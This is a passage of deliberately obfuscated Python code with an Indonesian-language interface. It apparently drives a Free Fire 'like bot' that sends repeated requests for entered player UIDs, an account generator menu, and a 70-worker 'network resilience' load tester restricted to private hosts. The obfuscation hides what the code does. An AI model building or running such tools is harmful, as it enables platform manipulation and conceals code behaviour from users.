                    if lllIIlIIIIIIllIlIIlIlIlI == 5716105:
                        return
                        break
                    if lllIIlIIIIIIllIlIIlIlIlI == 9095227:
                        input(f'\n{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}Press Enter untuk kembali...{getattr(IlIIIIIIlIIlIlll, 'RST')}')
                        lllIIlIIIIIIllIlIIlIlIlI = 5716105
                        continue
            lIllllIllllIIlllIl = 4471651
            continue
        if lIllllIllllIIlllIl == 7536912:
            load_license()
            lIllllIllllIIlllIl = 9150322
            continue
        if lIllllIllllIIlllIl == 1674133:
            print()
            lIllllIllllIIlllIl = 3401604
            continue
        if lIllllIllllIIlllIl == 6389705:
            lIllllIllllIIlllIl = 4362753
            continue
        if lIllllIllllIIlllIl == 1625567:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╔{'═' * IIIIllllllIlIlIllIIIIlI}╗')
            lIllllIllllIIlllIl = 6605129
            continue
        if lIllllIllllIIlllIl == 8093599:
            print(f'\n{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╔{'═' * IIIIllllllIlIlIllIIIIlI}╗')
            lIllllIllllIIlllIl = 6123429
            continue
        if lIllllIllllIIlllIl == 4471651:
            region = select_region()
            lIllllIllllIIlllIl = 5922996
            continue
        if lIllllIllllIIlllIl == 3401604:
            IlIIIIllIllIllI = []
            lIllllIllllIIlllIl = 6916166
            continue
        if lIllllIllllIIlllIl == 7161489:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╟{'─' * IIIIllllllIlIlIllIIIIlI}╢')
            lIllllIllllIIlllIl = 5740993
            continue
        if lIllllIllllIIlllIl == 9855583:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'TEXT_DIM')}Kosongkan (Enter) untuk selesai.{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            lIllllIllllIIlllIl = 8044386
            continue
        if lIllllIllllIIlllIl == 6914441:
            llllIIlIIIIlllIIIlI = int(llllIIlIIIIlllIIIlI) if getattr(llllIIlIIIIlllIIIlI, 'isdigit')() else 3
            lIllllIllllIIlllIl = 8093599
            continue
        if lIllllIllllIIlllIl == 6916166:
            while True:
                uid = getattr(input(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}{getattr(UI, 'ARROW')}{getattr(IlIIIIIIlIIlIlll, 'RST')} UID #{len(IlIIIIllIllIllI) + 1}: {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}'), 'strip')()
                if uid == '':
                    break
                if getattr(uid, 'isdigit')() and len(uid) >= 8:
                    getattr(IlIIIIllIllIllI, 'append')(uid)
                else:
                    print(f'{getattr(IlIIIIIIlIIlIlll, 'RED1')}❌ UID harus berupa angka minimal 8 digit!{getattr(IlIIIIIIlIIlIlll, 'RST')}')
            lIllllIllllIIlllIl = 5826053
            continue
        if lIllllIllllIIlllIl == 5922996:
            llllIIlIIIIlllIIIlI = getattr(input(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}{getattr(UI, 'ARROW')}{getattr(IlIIIIIIlIIlIlll, 'RST')} Jeda antar request (detik, default 3): {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}'), 'strip')()
            lIllllIllllIIlllIl = 6914441
            continue
        if lIllllIllllIIlllIl == 5740993:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'TEXT_DIM')}Masukkan UID satu per satu.{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            lIllllIllllIIlllIl = 9855583
            continue

def show_loop_warning():
    llIlllllIlIIIIllllllIIll = 1981539
    while True:
        if llIlllllIlIIIIllllllIIll == 5801384:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_simple(f'{getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}🔄 Memulai loop... Tekan CTRL+C untuk berhenti{getattr(IlIIIIIIlIIlIlll, 'RST')}', IIIIllllllIlIlIllIIIIlI)}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            llIlllllIlIIIIllllllIIll = 5310242
            continue
        if llIlllllIlIIIIllllllIIll == 7710872:
            llIlllllIlIIIIllllllIIll = 2355828
            continue
        if llIlllllIlIIIIllllllIIll == 8707033:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'RED_GLOW')}⚠️  PERINGATAN: Ini akan berjalan terus!{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            llIlllllIlIIIIllllllIIll = 5293912
            continue
        if llIlllllIlIIIIllllllIIll == 2693299:
            IIIlIlIlIllllIlIIIIIl = getattr(input(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}{getattr(UI, 'ARROW')}{getattr(IlIIIIIIlIIlIlll, 'RST')} Maksimal loop (kosongkan untuk unlimited): {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}'), 'strip')()
            llIlllllIlIIIIllllllIIll = 3779455
            continue
        if llIlllllIlIIIIllllllIIll == 4982574:
            try:
                like_loop(uid, region, lIlIIlIIlIIIlIl, IIIlIlIlIllllIlIIIIIl)
            except KeyboardInterrupt:
                print(f'\n{getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}⏹️  Loop dihentikan oleh pengguna!{getattr(IlIIIIIIlIIlIlll, 'RST')}')
            llIlllllIlIIIIllllllIIll = 2386157
            continue
        if llIlllllIlIIIIllllllIIll == 9469424:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╟{'─' * IIIIllllllIlIlIllIIIIlI}╢')
            llIlllllIlIIIIllllllIIll = 8707033
            continue
        if llIlllllIlIIIIllllllIIll == 3850736:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_simple(f'{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}🔄 LIKE LOOP (TERUS MENERUS){getattr(IlIIIIIIlIIlIlll, 'RST')}', IIIIllllllIlIlIllIIIIlI)}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            llIlllllIlIIIIllllllIIll = 9469424
            continue
        if llIlllllIlIIIIllllllIIll == 2355828:
            get_runtime_config()
            llIlllllIlIIIIllllllIIll = 9439195
            continue
        if llIlllllIlIIIIllllllIIll == 5259157:
            llIlllllIlIIIIllllllIIll = 1981539
            continue
        if llIlllllIlIIIIllllllIIll == 2054875:
            print(f'\n{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╔{'═' * IIIIllllllIlIlIllIIIIlI}╗')
            llIlllllIlIIIIllllllIIll = 5801384
            continue
        if llIlllllIlIIIIllllllIIll == 1981539:
            llIlllllIlIIIIllllllIIll = 5074132
            continue
        if llIlllllIlIIIIllllllIIll == 5310242:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╚{'═' * IIIIllllllIlIlIllIIIIlI}╝')
            llIlllllIlIIIIllllllIIll = 4982574
            continue
        if llIlllllIlIIIIllllllIIll == 5653052:
            region = select_region()
            llIlllllIlIIIIllllllIIll = 6003768
            continue
        if llIlllllIlIIIIllllllIIll == 3779455:
            IIIlIlIlIllllIlIIIIIl = int(IIIlIlIlIllllIlIIIIIl) if getattr(IIIlIlIlIllllIlIIIIIl, 'isdigit')() else None
            llIlllllIlIIIIllllllIIll = 2054875
            continue
        if llIlllllIlIIIIllllllIIll == 9439195:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╔{'═' * IIIIllllllIlIlIllIIIIlI}╗')
            llIlllllIlIIIIllllllIIll = 3850736
            continue
        if llIlllllIlIIIIllllllIIll == 5293912:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'TEXT_DIM')}    Tekan CTRL+C untuk menghentikan.{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            llIlllllIlIIIIllllllIIll = 5236496
            continue
        if llIlllllIlIIIIllllllIIll == 5074132:
            load_license()
            llIlllllIlIIIIllllllIIll = 2355828
            continue
        if llIlllllIlIIIIllllllIIll == 4053003:
            while True:
                uid = getattr(input(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}{getattr(UI, 'ARROW')}{getattr(IlIIIIIIlIIlIlll, 'RST')} Masukkan UID: {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}'), 'strip')()
                if getattr(uid, 'isdigit')() and len(uid) >= 8:
                    break
                print(f'{getattr(IlIIIIIIlIIlIlll, 'RED1')}❌ UID harus berupa angka minimal 8 digit!{getattr(IlIIIIIIlIIlIlll, 'RST')}')
            llIlllllIlIIIIllllllIIll = 5653052
            continue
        if llIlllllIlIIIIllllllIIll == 8954735:
            lIlIIlIIlIIIlIl = int(lIlIIlIIlIIIlIl) if getattr(lIlIIlIIlIIIlIl, 'isdigit')() else 60
            llIlllllIlIIIIllllllIIll = 2693299
            continue
        if llIlllllIlIIIIllllllIIll == 6003768:
            lIlIIlIIlIIIlIl = getattr(input(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}{getattr(UI, 'ARROW')}{getattr(IlIIIIIIlIIlIlll, 'RST')} Interval antar loop (detik, default 60): {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}'), 'strip')()
            llIlllllIlIIIIllllllIIll = 8954735
            continue
        if llIlllllIlIIIIllllllIIll == 5236496:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╚{'═' * IIIIllllllIlIlIllIIIIlI}╝')
            llIlllllIlIIIIllllllIIll = 1204933
            continue
        if llIlllllIlIIIIllllllIIll == 1204933:
            print()
            llIlllllIlIIIIllllllIIll = 4053003
            continue
        if llIlllllIlIIIIllllllIIll == 2386157:
            input(f'\n{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}Press Enter untuk kembali...{getattr(IlIIIIIIlIIlIlll, 'RST')}')
            break

def select_region():
    lllIIIIIlIllIlIlIIlllllI = 3686820
    while True:
        if lllIIIIIlIllIlIlIIlllllI == 1761096:
            lllIIIIIlIllIlIlIIlllllI = 4277039
            continue
        if lllIIIIIlIllIlIlIIlllllI == 3702064:
            print(f'\n{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}╔{'═' * IIIIllllllIlIlIllIIIIlI}╗')
            lllIIIIIlIllIlIlIIlllllI = 4277039
            continue
        if lllIIIIIlIllIlIlIIlllllI == 5455854:
            lllIIIIIlIllIlIlIIlllllI = 3702064
            continue
        if lllIIIIIlIllIlIlIIlllllI == 4277039:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_simple(f'{getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}🌍 PILIH REGION{getattr(IlIIIIIIlIIlIlll, 'RST')}', IIIIllllllIlIlIllIIIIlI)}{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}')
            lllIIIIIlIllIlIlIIlllllI = 1510719
            continue
        if lllIIIIIlIllIlIlIIlllllI == 3686820:
            if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][31] * 4 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][1] == 902:
                IlIlIllIIlllIIIIlIllIll = 9452232
                while True:
                    if IlIlIllIIlllIIIIlIllIll == 9452232:
                        IIlIIIIIllIllIIlIIllll = 76091009
                        IlIlIllIIlllIIIIlIllIll = 4064053
                        continue
                    if IlIlIllIIlllIIIIlIllIll == 7360538:
                        IlIlIllIIlllIIIIlIllIll = 9987088
                        continue
                    if IlIlIllIIlllIIIIlIllIll == 9877315:
                        IlIlIllIIlllIIIIlIllIll = 9452232
                        continue
                    if IlIlIllIIlllIIIIlIllIll == 4064053:
                        llIllllIIllIIllIIIlIIll = (IIlIIIIIllIllIIlIIllll * 3 ^ 6614713) & 65535
                        IlIlIllIIlllIIIIlIllIll = 9987088
                        continue
                    if IlIlIllIIlllIIIIlIllIll == 6043757:
                        lIIIIlIlllllIlll = sum(IIlIllllIllIllIlllll) + llIllllIIllIIllIIIlIIll % 23 - IIlIIIIIllIllIIlIIllll
                        break
                    if IlIlIllIIlllIIIIlIllIll == 9987088:
                        IIlIllllIllIllIlllll = [llIllllIIllIIllIIIlIIll >> 6 & 255 for IIllIllIlllIlIIlIllIlI in range(3)]
                        IlIlIllIIlllIIIIlIllIll = 6043757
                        continue
            lllIIIIIlIllIlIlIIlllllI = 3702064
            continue
        if lllIIIIIlIllIlIlIIlllllI == 7621693:
            lllIIIIIlIllIlIlIIlllllI = 4277039
            continue
        if lllIIIIIlIllIlIlIIlllllI == 5114670:
            if lIlIlllIIIIllIIIll == '1':
                return 'id'
            elif lIlIlllIIIIllIIIll == '2':
                return 'global'
            elif lIlIlllIIIIllIIIll == '3':
                return getattr(getattr(input(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}{getattr(UI, 'ARROW')}{getattr(IlIIIIIIlIIlIlll, 'RST')} Masukkan region: {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}'), 'strip')(), 'upper')()
            else:
                return 'id'
            break
        if lllIIIIIlIllIlIlIIlllllI == 9472788:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}╚{'═' * IIIIllllllIlIlIllIIIIlI}╝')
            lllIIIIIlIllIlIlIIlllllI = 5795353
            continue
        if lllIIIIIlIllIlIlIIlllllI == 5795353:
            lIlIlllIIIIllIIIll = getattr(input(f'\n{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}{getattr(UI, 'ARROW')}{getattr(IlIIIIIIlIIlIlll, 'RST')} Pilih [1-3]: {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}'), 'strip')()
            lllIIIIIlIllIlIlIIlllllI = 5114670
            continue
        if lllIIIIIlIllIlIlIIlllllI == 1510719:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}[{getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}1{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}]{getattr(IlIIIIIIlIIlIlll, 'RST')} ID (Indonesia){getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}')
            lllIIIIIlIllIlIlIIlllllI = 9927718
            continue
        if lllIIIIIlIllIlIlIIlllllI == 6774229:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}[{getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}3{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}]{getattr(IlIIIIIIlIIlIlll, 'RST')} Custom (ketik sendiri){getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}')
            lllIIIIIlIllIlIlIIlllllI = 9472788
            continue
        if lllIIIIIlIllIlIlIIlllllI == 9927718:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}[{getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}2{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}]{getattr(IlIIIIIIlIIlIlll, 'RST')} GLOBAL{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}')
            lllIIIIIlIllIlIlIIlllllI = 6774229
            continue

def show_proxy_menu():
    IlllIllIIIIlIllIII = 1369030
    while True:
        if IlllIllIIIIlIllIII == 6892432:
            while True:
                if not proxy_monitor():
                    print(f'{IIlllIlIlllllIlllllllll}❌ License tidak valid! Program berhenti.{llIIllllllIlllIlIIll}')
                    break
                load_license()
                get_runtime_config()
                IlIllIIllllllllIllIlIIl = 44
                print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╔{'═' * IlIllIIllllllllIllIlIIl}╗')
                print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_simple(f'{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}✦ MENU ✦{getattr(IlIIIIIIlIIlIlll, 'RST')}', IlIllIIllllllllIllIlIIl)}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
                print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╟{'─' * IlIllIIllllllllIllIlIIl}╢')
                print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}[{getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}1{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}]{getattr(IlIIIIIIlIIlIlll, 'RST')} Generate            {getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
                print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}[{getattr(IlIIIIIIlIIlIlll, 'RED_GLOW')}2{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}]{getattr(IlIIIIIIlIIlIlll, 'RST')} Telegram Bot         {getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
                print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}[{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}3{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}]{getattr(IlIIIIIIlIIlIlll, 'RST')} View Saved          {getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
                print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}[{getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}4{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}]{getattr(IlIIIIIIlIIlIlll, 'RST')} Like Bot (Free Fire){getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
                print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}[{getattr(IlIIIIIIlIIlIlll, 'CYAN_GLOW')}5{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}]{getattr(IlIIIIIIlIIlIlll, 'RST')} Network Resilience  {getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
                print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}[{getattr(IlIIIIIIlIIlIlll, 'RED_GLOW')}0{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}]{getattr(IlIIIIIIlIIlIlll, 'RST')} Exit                {getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
                print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╚{'═' * IlIllIIllllllllIllIlIIl}╝')
                try:
                    IIIllllIIllllllIllll = 8551257
                    while True:
                        if IIIllllIIllllllIllll == 8403176:
                            print(getattr(IlIIIIIIlIIlIlll, 'RST'), end='')
                            IIIllllIIllllllIllll = 6732816
                            continue
                        if IIIllllIIllllllIllll == 6732816:
                            if IllllIllIIlllIl == '1':
                                run_parallel_workers()
                            elif IllllIllIIlllIl == '2':
                                setup_telegram()
                            elif IllllIllIIlllIl == '3':
                                show_saved_accounts()
                            elif IllllIllIIlllIl == '4':
                                show_like_menu()
                            elif IllllIllIIlllIl == '5':
                                main()
                            elif IllllIllIIlllIl == '0':
                                IlIIlIlIlIIIIllIllIIll()
                            else:
                                print(f'{getattr(IlIIIIIIlIIlIlll, 'RED1')}{getattr(UI, 'CROSS')}{getattr(IlIIIIIIlIIlIlll, 'RST')} Invalid option')
                            break
                        if IIIllllIIllllllIllll == 9320244:
                            IIIllllIIllllllIllll = 9320244
                            continue
                        if IIIllllIIllllllIllll == 8551257:
                            IllllIllIIlllIl = getattr(input(f'\n{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}{getattr(UI, 'ARROW')}{getattr(IlIIIIIIlIIlIlll, 'RST')} Choice [0-5]: {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}'), 'strip')()
                            IIIllllIIllllllIllll = 8403176
                            continue
                        if IIIllllIIllllllIllll == 4890806:
                            IIIllllIIllllllIllll = 6732816
                            continue
                        if IIIllllIIllllllIllll == 7300979:
                            IIIllllIIllllllIllll = 4890806
                            continue
                except KeyboardInterrupt:
                    IlIIlIlIlIIIIllIllIIll()
                except Exception as e:
                    print(f'{getattr(IlIIIIIIlIIlIlll, 'RED1')} Error: {e}{getattr(IlIIIIIIlIIlIlll, 'RST')}')
                    input('Press Enter to continue...')
            break
        if IlllIllIIIIlIllIII == 3345379:
            IlllIllIIIIlIllIII = 6892432
            continue
        if IlllIllIIIIlIllIII == 7324330:
            IlllIllIIIIlIllIII = 3345379
            continue
        if IlllIllIIIIlIllIII == 1369030:
            if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][24] * 42 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][2] == 7295:
                llIIIIlIIlIlIIlIllIIII = 5368194
                while True:
                    if llIIIIlIIlIlIIlIllIIII == 5368194:
                        llIllIlIIIIlIIlllIllIIIl = [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][7] * 882811 + 122
                        llIIIIlIIlIlIIlIllIIII = 3257321
                        continue
                    if llIIIIlIIlIlIIlIllIIII == 8499141:
                        IlIIIlllllllIIIIlIlI = sum(lIIlIlllIIlllII) + lIlIlllllIIllIllIllIl % 50 - llIllIlIIIIlIIlllIllIIIl
                        break
                    if llIIIIlIIlIlIIlIllIIII == 6507122:
                        lIIlIlllIIlllII = [lIlIlllllIIllIllIllIl >> 9 & 255 for lIlIIlllIlIlIlllllll in range(4)]
                        llIIIIlIIlIlIIlIllIIII = 8499141
                        continue
                    if llIIIIlIIlIlIIlIllIIII == 3030815:
                        llIIIIlIIlIlIIlIllIIII = 3030815
                        continue
                    if llIIIIlIIlIlIIlIllIIII == 5435552:
                        llIIIIlIIlIlIIlIllIIII = 5435552
                        continue
                    if llIIIIlIIlIlIIlIllIIII == 3257321:
                        lIlIlllllIIllIllIllIl = (llIllIlIIIIlIIlllIllIIIl * 4 ^ 8855715) & 4294967295
                        llIIIIlIIlIlIIlIllIIII = 6507122
                        continue
            IlllIllIIIIlIllIII = 7336118
            continue
        if IlllIllIIIIlIllIII == 4071940:
            IlllIllIIIIlIllIII = 4071940
            continue
        if IlllIllIIIIlIllIII == 7336118:
            getattr(lIlIlIIllllllllllIlII, 'start')()
            IlllIllIIIIlIllIII = 6892432
            continue
lllIllIlllIlIlIIlllllIll = getattr(__import__('importlib'), 'import_module')('ipaddress')
IIllIIlIlIIllIIlIlIllI = {'enabled': True, 'base_url': getattr(IllIlllllIlIIllIlIllI, 'getenv')('NETWORK_TEST_TARGET', ''), 'allowed_hosts': ['127.0.0.1', 'localhost', '192.168.0.0/16', '10.0.0.0/8', '172.16.0.0/12']}
lllllIIlIIIllIIIllII = {'worker_count': 70, 'request_interval': 0.25, 'jitter': 0.1, 'allocation_strategy': 'round_robin', 'test_mode': False, 'max_duration_seconds': 60, 'failure_backoff': 0.1}

class IIIIlIIlIIlIlIl:

    @staticmethod
    def validate_target(base_url, allowed_hosts):
        llIlllIlIlIIllllll = 1638997
        while True:
            if llIlllIlIlIIllllll == 7485170:
                llIlllIlIlIIllllll = 3557952
                continue
            if llIlllIlIlIIllllll == 4095094:
                try:
                    lIIlIIIIIIIllIIlIIIIII = 1705966
                    while True:
                        if lIIlIIIIIIIllIIlIIIIII == 1891768:
                            return (False, f'Host IP {IIlIIllIlIIlIlIlIIllIl} is not in authorized target allowlist')
                            break
                        if lIIlIIIIIIIllIIlIIIIII == 4386148:
                            for lIllIllIlIlIIIIllI in allowed_hosts:
                                try:
                                    if '/' in lIllIllIlIlIIIIllI:
                                        llllIlIllIIlIlllIIlIIIll = getattr(lllIllIlllIlIlIIlllllIll, 'ip_network')(lIllIllIlIlIIIIllI, strict=False)
                                        if IIlIIllIlIIlIlIlIIllIl in llllIlIllIIlIlllIIlIIIll:
                                            return (True, str(IIlIIllIlIIlIlIlIIllIl))
                                    else:
                                        IIlIlIIIIlIIIIlIIlIl = 9730887
                                        while True:
                                            if IIlIlIIIIlIIIIlIIlIl == 5653555:
                                                IlIllIIlIIlllIIl = getattr(lllIllIlllIlIlIIlllllIll, 'ip_address')(lIllIllIlIlIIIIllI)
                                                IIlIlIIIIlIIIIlIIlIl = 1406987
                                                continue
                                            if IIlIlIIIIlIIIIlIIlIl == 1829080:
                                                IIlIlIIIIlIIIIlIIlIl = 5942669
                                                continue
                                            if IIlIlIIIIlIIIIlIIlIl == 1406987:
                                                if IIlIIllIlIIlIlIlIIllIl == IlIllIIlIIlllIIl:
                                                    return (True, str(IIlIIllIlIIlIlIlIIllIl))
                                                break
                                            if IIlIlIIIIlIIIIlIIlIl == 5942669:
                                                IIlIlIIIIlIIIIlIIlIl = 5653555
                                                continue
                                            if IIlIlIIIIlIIIIlIIlIl == 9730887:
                                                if lIllIllIlIlIIIIllI == 'localhost' and host == 'localhost':
                                                    return (True, 'localhost')
                                                IIlIlIIIIlIIIIlIIlIl = 5653555
                                                continue
                                            if IIlIlIIIIlIIIIlIIlIl == 8441961:
                                                IIlIlIIIIlIIIIlIIlIl = 1406987
                                                continue
                                except ValueError:
                                    continue
                            lIIlIIIIIIIllIIlIIIIII = 1891768
                            continue
                        if lIIlIIIIIIIllIIlIIIIII == 8799354:
                            if host == 'localhost':
                                return (True, 'localhost')
                            lIIlIIIIIIIllIIlIIIIII = 5132199
                            continue
                        if lIIlIIIIIIIllIIlIIIIII == 4488631:
                            host = getattr(lIllllllIllIIlIlIlIIlIl, 'hostname')
                            lIIlIIIIIIIllIIlIIIIII = 1961289
                            continue
                        if lIIlIIIIIIIllIIlIIIIII == 1705966:
                            lIllllllIllIIlIlIlIIlIl = getattr(getattr(urllib, 'parse'), 'urlparse')(base_url)
                            lIIlIIIIIIIllIIlIIIIII = 4488631
                            continue
                        if lIIlIIIIIIIllIIlIIIIII == 3922863:
                            lIIlIIIIIIIllIIlIIIIII = 1705966
                            continue
                        if lIIlIIIIIIIllIIlIIIIII == 5132199:
                            try:
                                IIlIIllIlIIlIlIlIIllIl = getattr(lllIllIlllIlIlIIlllllIll, 'ip_address')(host)
                            except ValueError:
                                try:
                                    lllllIlIlIlIlllIlII = getattr(IIIIIllllIIlIllIlIIIIIl, 'gethostbyname')(host)
                                    IIlIIllIlIIlIlIlIIllIl = getattr(lllIllIlllIlIlIIlllllIll, 'ip_address')(lllllIlIlIlIlllIlII)
                                except Exception as e:
                                    return (False, f"Could not resolve target host '{host}': {e}")
                            lIIlIIIIIIIllIIlIIIIII = 4386148
                            continue
                        if lIIlIIIIIIIllIIlIIIIII == 1961289:
                            if not host:
                                return (False, 'Invalid target host')
                            lIIlIIIIIIIllIIlIIIIII = 8799354
                            continue
                except Exception as e:
                    return (False, f'Target validation error: {e}')
                break
            if llIlllIlIlIIllllll == 1088593:
                if not base_url:
                    return (False, 'Target URL is empty')
                llIlllIlIlIIllllll = 4095094
                continue
            if llIlllIlIlIIllllll == 1638997:
